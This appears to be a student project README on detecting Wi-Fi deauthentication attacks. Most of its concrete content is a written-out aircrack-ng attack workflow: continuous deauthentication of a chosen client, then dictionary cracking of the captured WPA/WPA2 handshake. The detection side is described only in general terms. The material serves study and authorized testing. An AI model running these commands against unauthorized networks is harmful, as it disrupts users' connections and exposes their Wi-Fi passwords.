# IIT-Patna-Project-2
### Silent Disruption: Detecting and Defending Against Wi-Fi Deauthentication Attacks ###
Submitted by: Sushil Singh
📌 Introduction

##  Problem Statement
Public library, coffee shop, and campus Wi-Fi networks are susceptible to deauthentication (deauth) attacks Deauthentication (Deauth) attacks are among the most prevalent Wi-Fi attacks since they take advantage of unsecured 802.11 management frames. Victims can be bounced from Wi-Fi, resulting in service disruption or password-cracking attack exposure. This project offers an early-warning system that alerts users and admins to these attacks before extensive harm is done.

## Project Goal
**Objective:** To create and deploy a **Wi-Fi Intrusion Detection Framework** that will detect and notify users of deauth, probe, and beacon flood attacks in real-time or through offline detection.

This project demonstrates the use of the Aircrack-ng suite, a set of tools for auditing wireless networks. The project focuses on:

Capturing wireless packets

Performing deauthentication attacks (for testing purposes only, on authorized systems)

Cracking WPA/WPA2 handshake captures

Detecting and logging deauthentication attacks

⚠️ Disclaimer: This project is strictly for educational and authorized penetration testing purposes. Performing attacks on networks without explicit permission is illegal.

🛠️ Tools Used
1. airmon-ng

Purpose: Enables monitor mode on the wireless interface.

Example Command:

sudo airmon-ng start wlan0


Output: Creates a new interface (e.g., wlan0mon) for monitoring.

2. airodump-ng

Purpose: Captures raw 802.11 frames, including handshake packets.

Example Command:

sudo airodump-ng wlan0mon


Usage: Displays nearby Wi-Fi networks, their BSSID, channel, encryption type, and connected clients.

3. aireplay-ng

Purpose: Performs packet injection attacks.

Example Command (Deauthentication Attack):

sudo aireplay-ng --deauth 0 -a [BSSID] -c [client MAC] wlan0mon


--deauth 0: Sends continuous deauthentication frames.

-a [BSSID]: Target Access Point MAC address.

-c [client MAC]: Specific client’s MAC address (optional).

Use Case: Forces a client to reconnect, allowing capture of WPA/WPA2 handshake.

4. aircrack-ng

Purpose: Cracks WPA/WPA2 handshakes using wordlists.

Example Command:

aircrack-ng -w [wordlist] [capture_file.cap]


-w [wordlist]: Path to password dictionary.

[capture_file.cap]: File containing captured handshake.

⚙️ Project Workflow

Enable monitor mode

sudo airmon-ng start wlan0


Scan networks and capture traffic

sudo airodump-ng wlan0mon


Force client deauthentication (for handshake capture)

sudo aireplay-ng --deauth 0 -a [BSSID] -c [client MAC] wlan0mon


Crack the captured handshake

aircrack-ng -w [wordlist] [capture_file.cap]

🔒 Security Enhancements in Final System

The final system goes beyond just demonstrating attacks:

Logging: All deauthentication attempts are recorded for analysis.

Alerting: The system triggers an alert when a deauthentication attack is detected.

Countermeasures: Optionally, the system can change Wi-Fi settings (such as switching channels) to mitigate the attack.

📂 Project Deliverables

Scripts/Commands Used

sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo aireplay-ng --deauth 0 -a [BSSID] -c [client MAC] wlan0mon
aircrack-ng -w [wordlist] [capture_file.cap]


Logs: Record of detected deauthentication attempts.

Report: Detailed documentation of methodology, findings, and mitigation strategies.

🚨 Legal & Ethical Considerations

This project must only be executed on networks you own or have explicit authorization to test. Unauthorized use of these tools against third-party networks is illegal and punishable under cybersecurity laws.


